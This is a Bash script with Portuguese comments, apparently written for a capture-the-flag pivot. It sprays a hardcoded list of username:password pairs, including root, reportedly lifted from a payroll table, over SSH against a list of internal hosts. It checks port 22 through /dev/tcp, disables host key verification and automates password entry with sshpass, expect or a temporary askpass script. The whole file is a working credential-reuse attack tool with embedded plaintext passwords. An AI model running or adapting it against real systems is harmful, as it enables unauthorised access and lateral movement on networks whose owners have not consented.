#!/usr/bin/env bash
# Varredura SSH em varios hosts com pares user:pass (payroll + extras).
# Pensado para pivot CTF onde ja tens credenciais em claro (user.txt / ssh.sh).
#
# Uso:
#   bash ssh_sweep.sh
#   bash ssh_sweep.sh 192.168.80.1 10.20.20.57 10.20.20.1
#   HOSTS_FILE=./hosts_ssh.txt bash ssh_sweep.sh
#   CREDS_FILE=./meus_pares.txt bash ssh_sweep.sh 192.168.80.1
#   SSH_BIN=/usr/bin/ssh CONNECT_TIMEOUT=7 bash ssh_sweep.sh
#
# Variaveis:
#   SSH_BIN          (default: primeiro `ssh` no PATH, senao /tmp/openssh-root/usr/bin/ssh)
#   CONNECT_TIMEOUT  (default: 6)
#   SSH_REMOTE_CMD   (default: whoami)  — comando nao-interactivo apos auth
#   STOP_ON_HIT      (default: 0)       — 1 = para no primeiro sucesso global
#   SKIP_PORT_CHECK  (default: 0)     — 1 = nao testa /dev/tcp/22 antes
#   HOSTS_FILE       ficheiro: um host por linha (# comenta)
#   CREDS_FILE       ficheiro: linhas user:pass (# comenta; : no user raro)

set -uo pipefail

CONNECT_TIMEOUT="${CONNECT_TIMEOUT:-6}"
SSH_REMOTE_CMD="${SSH_REMOTE_CMD:-whoami}"
STOP_ON_HIT="${STOP_ON_HIT:-0}"
SKIP_PORT_CHECK="${SKIP_PORT_CHECK:-0}"
LOG_FILE="${LOG_FILE:-/tmp/ssh_sweep_$(date +%Y%m%d_%H%M%S).log}"

_resolve_ssh_bin() {
  if [[ -n "${SSH_BIN:-}" && -x "${SSH_BIN}" ]]; then
    printf '%s' "${SSH_BIN}"
    return
  fi
  if command -v ssh >/dev/null 2>&1; then
    command -v ssh
    return
  fi
  if [[ -x "/tmp/openssh-root/usr/bin/ssh" ]]; then
    printf '%s' "/tmp/openssh-root/usr/bin/ssh"
    return
  fi
  echo "[!] Nenhum ssh executavel (defina SSH_BIN=...)" >&2
  return 1
}

SSH_BIN="$(_resolve_ssh_bin)" || exit 1

# Pares 1:1 (tabela payroll + reutilizacao tipica SSH/MySQL)
declare -a PAIRS=(
  "nickj:ZeqlcR2!4gN"
  "leonardz:averylongpasswordfornohackertodiscover"
  "anneh:VSZ785-aWB15#q"
  "joaos:F147-0356agipV"
  "joshuaa:QW5al7oPN2-1"
  "jonasf:minecraft123"
  "dmitrip:42W#wskb-62wA\$sc"
  "root:pujkFGC471-2j"
  "ubuntu:ZeqlcR2!4gN"
)

_load_creds_file() {
  local f="${1:-}"
  [[ -z "${f}" || ! -r "${f}" ]] && return 0
  while IFS= read -r line || [[ -n "${line}" ]]; do
    [[ -z "${line}" || "${line}" =~ ^[[:space:]]*# ]] && continue
    [[ "${line}" == *:* ]] || continue
    PAIRS+=("${line}")
  done <"${f}"
}

_collect_hosts() {
  HOSTS=()
  if [[ -n "${HOSTS_FILE:-}" && -r "${HOSTS_FILE}" ]]; then
    while IFS= read -r line || [[ -n "${line}" ]]; do
      line="${line%%#*}"
      line="${line//[[:space:]]/}"
      [[ -z "${line}" ]] && continue
      HOSTS+=("${line}")
    done <"${HOSTS_FILE}"
  fi
  for a in "$@"; do
    [[ -z "${a}" ]] && continue
    HOSTS+=("${a}")
  done
  if [[ ${#HOSTS[@]} -eq 0 ]]; then
    HOSTS=(
      "192.168.80.1"
      "192.168.80.2"
      "192.168.80.3"
      "192.168.80.4"
      "10.20.20.1"
      "10.20.20.15"
      "10.20.20.19"
      "10.20.20.57"
      "127.0.0.1"
    )
  fi
}

_port22_open() {
  local h="$1"
  [[ "${SKIP_PORT_CHECK}" == "1" ]] && return 0
  if command -v timeout >/dev/null 2>&1; then
    timeout 2 bash -c "echo >/dev/tcp/${h}/22" 2>/dev/null
  else
    bash -c "echo >/dev/tcp/${h}/22" 2>/dev/null
  fi
}

_pick_ssh_method() {
  if command -v sshpass >/dev/null 2>&1; then
    printf '%s' "sshpass"
  elif command -v expect >/dev/null 2>&1; then
    printf '%s' "expect"
  elif command -v setsid >/dev/null 2>&1; then
    printf '%s' "askpass"
  else
    printf '%s' "manual"
  fi
}

_try_pair() {
  local host="$1" user="$2" pass="$3"
  local attempt_log rc

  attempt_log="/tmp/.ssh_sweep_${host//./_}_${user}_$$.log"
  : >"${attempt_log}"

  if [[ "${SSH_METHOD}" == "manual" ]]; then
    echo "[!] ${host}: sem sshpass/expect/setsid — comando manual:" | tee -a "${LOG_FILE}"
    echo "    SSHPASS manual: ${SSH_BIN} -o ConnectTimeout=${CONNECT_TIMEOUT} ... ${user}@${host} '${SSH_REMOTE_CMD}'" | tee -a "${LOG_FILE}"
    return 1
  fi

  if ! command -v script >/dev/null 2>&1 && [[ "${SSH_METHOD}" == "sshpass" || "${SSH_METHOD}" == "expect" ]]; then
    echo "[!] Instala 'script' (util-linux) ou use metodo askpass (setsid)." | tee -a "${LOG_FILE}"
    return 1
  fi

  set +e
  if [[ "${SSH_METHOD}" == "sshpass" ]]; then
    script -q -c "SSHPASS='${pass}' sshpass -e '${SSH_BIN}' \
      -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null \
      -o PreferredAuthentications=password \
      -o PubkeyAuthentication=no \
      -o ConnectTimeout=${CONNECT_TIMEOUT} \
      -o NumberOfPasswordPrompts=1 \
      '${user}@${host}' '${SSH_REMOTE_CMD}'" /dev/null >"${attempt_log}" 2>&1
    rc=$?
  elif [[ "${SSH_METHOD}" == "expect" ]]; then
    script -q -c "expect -c '
      set timeout $((CONNECT_TIMEOUT + 4))
      spawn ${SSH_BIN} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=${CONNECT_TIMEOUT} ${user}@${host} ${SSH_REMOTE_CMD}
      expect {
        -re \"(?i)assword:\" { send \"${pass}\r\"; exp_continue }
        -re \"Permission denied\" { exit 2 }
        eof
      }
    '" /dev/null >"${attempt_log}" 2>&1
    rc=$?
  else
    local askpass_script
    askpass_script="/tmp/.askpass_sweep_${host//./_}_${user}_$$.sh"
    cat >"${askpass_script}" <<EOF
#!/usr/bin/env bash
printf '%s\n' '${pass}'
EOF
    chmod 700 "${askpass_script}"
    DISPLAY=:0 SSH_ASKPASS="${askpass_script}" SSH_ASKPASS_REQUIRE=force \
      setsid "${SSH_BIN}" \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no \
        -o NumberOfPasswordPrompts=1 \
        -o ConnectTimeout="${CONNECT_TIMEOUT}" \
        "${user}@${host}" "${SSH_REMOTE_CMD}" >"${attempt_log}" 2>&1
    rc=$?
    rm -f "${askpass_script}"
  fi

  if grep -qi "Permission denied" "${attempt_log}" 2>/dev/null; then
    rm -f "${attempt_log}"
    return 1
  fi
  if [[ ${rc} -eq 0 ]] && ! grep -qi "Permission denied" "${attempt_log}" 2>/dev/null; then
    echo "[+] SUCESSO ${user}@${host}  (rc=0)" | tee -a "${LOG_FILE}"
    echo "--- saida ---" | tee -a "${LOG_FILE}"
    tee -a "${LOG_FILE}" <"${attempt_log}"
    echo "-------------" | tee -a "${LOG_FILE}"
    rm -f "${attempt_log}"
    return 0
  fi
  rm -f "${attempt_log}"
  return 1
}

main() {
  _load_creds_file "${CREDS_FILE:-}"
  _collect_hosts "$@"

  SSH_METHOD="$(_pick_ssh_method)"

  touch "${LOG_FILE}" 2>/dev/null || LOG_FILE="/dev/null"
  {
    echo "[*] ssh_sweep — $(date -uIs)"
    echo "[*] SSH_BIN=${SSH_BIN}"
    echo "[*] Metodo=${SSH_METHOD}"
    echo "[*] Hosts (${#HOSTS[@]}): ${HOSTS[*]}"
    echo "[*] Pares (${#PAIRS[@]}) + CREDS_FILE=${CREDS_FILE:-}"
    echo "[*] Log=${LOG_FILE}"
    echo ""
  } | tee -a "${LOG_FILE}"

  local host user pass ok_any
  ok_any=0
  for host in "${HOSTS[@]}"; do
    echo "[*] === Host ${host} ===" | tee -a "${LOG_FILE}"
    if ! _port22_open "${host}"; then
      echo "[.] ${host}:22 fechado ou sem resposta (skip)" | tee -a "${LOG_FILE}"
      continue
    fi
    echo "[+] ${host}:22 aberto — a testar ${#PAIRS[@]} pares" | tee -a "${LOG_FILE}"
    for pair in "${PAIRS[@]}"; do
      user="${pair%%:*}"
      pass="${pair#*:}"
      if _try_pair "${host}" "${user}" "${pass}"; then
        ok_any=1
        [[ "${STOP_ON_HIT}" == "1" ]] && {
          echo "[*] STOP_ON_HIT=1 — a terminar." | tee -a "${LOG_FILE}"
          exit 0
        }
      else
        echo "[-] falhou ${user}@${host}" | tee -a "${LOG_FILE}"
      fi
    done
    echo "" | tee -a "${LOG_FILE}"
  done

  if [[ "${ok_any}" -eq 0 ]]; then
    echo "[-] Nenhum par funcionou nos hosts com :22 aberto." | tee -a "${LOG_FILE}"
    exit 1
  fi
  exit 0
}

main "$@"
